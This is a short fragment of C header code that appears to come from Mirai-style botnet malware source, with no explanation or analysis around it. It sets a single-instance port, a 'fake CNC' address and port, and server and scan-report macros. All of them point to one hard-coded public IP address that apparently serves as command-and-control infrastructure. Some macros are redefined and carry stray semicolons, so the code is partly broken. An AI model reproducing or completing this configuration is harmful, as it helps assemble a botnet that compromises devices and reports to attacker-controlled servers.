...
#define SINGLE_INSTANCE_PORT 2333

#define FAKE_CNC_ADDR INET_ADDR(107,150,25,28)
#define FAKE_CNC_PORT 23
/* 

*/
#define SERVIP (int)inet_addr((const char*)"107.150.25.28");
#define SCANIP (int)inet_addr((const char*)"107.150.25.28");
#ifdef USEDOMAIN
#define SCANIP (int)inet_addr((const char*)"107.150.25.28");
#define SERVIP (int)inet_addr((const char*)"107.150.25.28");
#endif
